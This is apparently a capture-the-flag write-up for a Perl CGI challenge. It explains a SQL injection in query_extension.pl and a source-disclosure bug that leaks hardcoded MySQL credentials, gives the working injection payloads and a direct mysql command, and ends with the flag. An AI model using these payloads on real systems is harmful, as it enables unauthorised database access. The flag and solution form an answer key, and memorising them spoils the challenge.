# Query-Extension — Writeup

## Vulnerability

`query_extension.pl` embeds the `cboname` CGI parameter directly into a SQL query:

```perl
$sth = $dbh->prepare(
  "SELECT first, extension FROM Employees WHERE last = '$cboname';"
);
```

No quoting or parameterization. Classic SQL injection.

Additionally, the MySQL credentials (`dbuser` / `dbsecret`) and the host
(`saa.basstard.com`) are hardcoded in the script — readable by anyone who
triggers the source-disclosure bug in `checkperl.pl`.

## Exploitation

### 1. Read all employees

```
GET /cgi-bin/query_extension.pl?cboname=' OR '1'='1
```

### 2. Union-based injection to read arbitrary tables

```
GET /cgi-bin/query_extension.pl?cboname=' UNION SELECT flag,1 FROM flags-- -
```

### 3. Direct DB access using leaked credentials

The companion script `checkperl.pl` discloses the source of any Perl file on the
server: `GET /cgi-bin/checkperl.pl?/path/to/script.pl`.  Use it to read
`query_extension.pl`, extract `dbuser`/`dbsecret`, then connect directly:

```bash
mysql -h saa.basstard.com -u dbuser -pdbsecret corpdb -e "SELECT * FROM flags;"
```

## Flag

`FLAG_ICTF2002{sqli_plus_hardcoded_creds_equals_game_over}`
